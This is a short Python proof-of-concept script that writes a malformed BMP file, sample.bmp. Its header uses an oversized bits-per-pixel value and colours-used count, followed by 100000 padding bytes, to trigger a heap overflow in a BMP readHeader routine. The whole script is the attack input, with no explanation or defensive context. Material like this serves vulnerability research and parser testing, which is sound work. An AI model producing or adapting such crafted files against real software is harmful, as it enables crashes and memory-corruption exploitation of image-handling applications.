#!/usr/bin/env python
#bmp readHeader heap overflow
import struct

s='BM'
s+='ABCD'
s+='\x00\x00\x00\x00'
s+='\x00\x00\x00\x00'
s+=struct.pack('<L',36)

s+=struct.pack('<L',10)#w
s+=struct.pack('<L',10)#h
s+=struct.pack('<L',8<<16)#bpp
s+=struct.pack('<L',1)#rlecode
s+='a'*12
s+=struct.pack('<L',(100100)/4)#clrused
s+='x'*100000

s=s.replace('ABCD',struct.pack('<L',len(s)))
file('sample.bmp','wb').write(s)

